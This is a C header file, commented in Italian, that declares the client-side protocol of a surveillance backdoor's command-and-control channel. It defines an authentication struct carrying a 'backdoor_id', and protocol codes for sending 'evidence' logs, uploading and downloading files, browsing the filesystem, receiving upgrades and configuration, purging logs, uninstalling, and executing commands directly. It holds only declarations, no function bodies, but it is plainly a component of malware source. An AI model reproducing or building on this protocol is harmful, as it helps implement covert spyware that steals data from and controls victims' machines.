// Struttura di un elemento per il filesystem browsing
typedef struct {
	DWORD depth;
	WCHAR *start_dir;
} fs_browse_elem;

// Funzioni esportate
extern BOOL ASP_Start(char *, char *);
extern void ASP_Stop(void);
extern void ASP_Bye(void);
extern BOOL ASP_Auth(char *, BYTE *, char *, BYTE *, DWORD *);
extern BOOL ASP_Id(WCHAR *, WCHAR *, long long *, DWORD *, DWORD);
extern BOOL ASP_GetUpload(BOOL, WCHAR *, DWORD, DWORD *);
extern BOOL ASP_GetDownload(DWORD *, WCHAR ***);
extern BOOL ASP_SendLog(char *, DWORD);
extern BOOL ASP_ReceiveConf(char *);
extern BOOL ASP_GetFileSystem(DWORD *, fs_browse_elem **);
extern BOOL ASP_GetCommands(DWORD *, WCHAR ***);
extern BOOL ASP_SendStatus(DWORD log_count, UINT64 log_size);
extern BOOL ASP_HandlePurge(long long *purge_time, DWORD *purge_size);

// Valori di ritorno della funzione ASP_Poll()
#define ASP_POLL_FETCHING 0
#define ASP_POLL_DONE 1
#define ASP_POLL_ERROR 2

// Comandi del protocollo
#define INVALID_COMMAND         (UINT)0x0       // Non usare
#define PROTO_OK                (UINT)0x1       // OK
#define PROTO_NO                (UINT)0x2       // Richiesta senza risposta
#define PROTO_BYE               (UINT)0x3       // Chiusura di connessione
#define PROTO_CHALLENGE         (UINT)0x4       // Autenticazione
#define PROTO_ID                (UINT)0xf       // Identificazione    
#define PROTO_NEW_CONF          (UINT)0x7       // Nuova configurazione
#define PROTO_UNINSTALL         (UINT)0xa       // Disinstallazione
#define PROTO_DOWNLOAD          (UINT)0xc       // DOWNLOAD, restituisce la lista dei nomi(in WCHAR, NULL terminati)
#define PROTO_UPLOAD            (UINT)0xd       // UPLOAD, restituisce la lista di coppie: nome,directory.
#define PROTO_LOG               (UINT)0x09      // Spedisce un evidence
#define PROTO_UPGRADE           (UINT)0x16      // Riceve un upgrade
#define PROTO_FILESYSTEM        (UINT)0x19      // Riceve le richieste relative al filesystem
#define PROTO_LOGSTATUS         (UINT)0x0b      // Invia il numero e la size dei log da spedire
#define PROTO_PURGE				(UINT)0x1a		// Elimina i file di log vecchi o troppo grossi
#define PROTO_COMMANDS			(UINT)0x1b		// Esecuzione diretta di comandi

// Strutture inviate o ritornate via IPC al core
typedef struct {
	DWORD server_addr;
	DWORD server_port;
} asp_reply_setup;

typedef struct {
	DWORD upload_left;
	WCHAR file_name[MAX_PATH];
} asp_reply_upload;

typedef struct {
	char backdoor_id[32];
	BYTE instance_id[20];
	char subtype[16];
	BYTE conf_key[16];
} asp_request_auth;

typedef struct {
	WCHAR username[80];
	WCHAR device[80];
} asp_request_id;

typedef struct {
	WCHAR file_name[MAX_PATH];
	DWORD byte_per_second;
} asp_request_log;

#pragma pack(4)
typedef struct {
	DWORD log_count;
	UINT64 log_size;
} asp_request_stat;

typedef struct {
	long long purge_time;
	DWORD purge_size;
} asp_reply_purge;
#pragma pack()

typedef struct {
	WCHAR conf_path[MAX_PATH];
}asp_request_conf;